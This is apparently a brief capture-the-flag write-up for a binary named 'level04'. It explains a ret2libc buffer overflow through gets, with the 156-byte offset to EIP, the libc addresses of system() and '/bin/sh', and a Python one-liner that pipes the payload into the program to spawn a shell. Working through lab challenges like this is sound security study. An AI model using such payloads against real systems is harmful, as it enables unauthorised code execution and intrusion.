We will need to overflow the buffer with gets and do a ret2libc exploit.

First, we need the address of system because the command we want to launch is "/bin/sh"

The idea here is to do the following:

payload = offset + address of system() + return address for system() + address of "/bin/sh"

Since we do a buffer overload, we will overwrite EIP (0xffffcfbc - 0xffffcf20 = 156), and put our payload instead. The code will than launch system with sh as parameter.


find __libc_start_main, +99999999, "/bin/sh"

payload = python -c "print('A' * 156 + 0xf7e6aed0 + 0xf7e5eb70 + 0xf7f897ec)"

python -c "print('A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')" | ./level04
